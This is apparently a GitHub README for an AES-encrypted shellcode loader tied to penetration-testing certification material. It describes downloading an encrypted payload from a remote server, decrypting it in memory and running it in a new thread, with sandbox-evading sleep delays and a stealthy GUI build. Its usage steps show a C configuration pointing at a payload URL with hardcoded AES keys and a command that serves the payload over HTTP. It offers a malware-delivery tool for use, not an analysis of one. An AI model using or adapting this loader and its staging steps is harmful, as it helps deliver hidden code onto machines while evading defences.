# AESShellcodeLoader
AES-256-CBC Encrypted Shellcode Loader - Downloads AES-encrypted shellcode from a remote URL, decrypts it in memory, and executes it with advanced evasion techniques.

## Overview
A shellcode loader that demonstrates secure payload staging using AES-256-CBC encryption. The loader downloads an encrypted binary from a web server, decrypts it using hardcoded AES keys and IVs, allocates executable memory, and runs the decrypted shellcode as a new thread. Includes anti-analysis features like random sleep delays (noise) and follows modern Windows API usage with BCrypt for cryptographic operations

## Key Features
- **AES-256-CBC Decryption**: Military-grade symmetric encryption using Windows BCrypt API
- **Remote Payload Retrieval**: Downloads encrypted shellcode via HTTP/HTTPS using WinINet
- **Memory-Only Execution**: Never writes decrypted payload to disk
- **Anti-Analysis Techniques**: Random sleep delays to frustrate sandboxes and dynamic analysis
- **Dynamic Memory Management**: Uses HeapAlloc/LocalAlloc for flexible buffer handling
- **Thread-Based Execution**: Runs shellcode in a separate thread for persistence
- **No Console Dependencies**: Can be compiled as GUI application for stealth

## Usage
1. Generate the encrypted payload using [aesCipher.py](https://github.com/VictorNS69/osep-material/blob/main/scripts/encoders-and-ciphers/aesCipher.py)
2. Update `Source.c` with the shellcode URL, Aes Key and Aes IV
```c
LPCWSTR binFile = L"http://192.168.45.1:80/apollo.bin.enc";
unsigned char AesKey[] = {
        0x6B, 0x06, 0xB0, 0x63, 0xBF, 0x97, 0x4C, 0x66, 0x6B, 0x88, 0xB4, 0x99, 0x42, 0xFB, 0x5E, 0xB4,
        0x3E, 0xEB, 0xBF, 0x38, 0xE0, 0x53, 0x94, 0xC8, 0x67, 0xDD, 0xAF, 0xFC, 0x1F, 0xE6, 0xC3, 0x44
};
unsigned char AesIv[] = {
    0x47, 0x9D, 0x1D, 0xF0, 0x7C, 0xA1, 0xD2, 0x4C, 0x18, 0x55, 0xBD, 0x30, 0xAB, 0xCB, 0x9B, 0xAA
};
```
3. Compile the project with Visual Studio
4. Host your payload
```bash
python -m http.server 80
```
5. Run the loader (`.exe`)
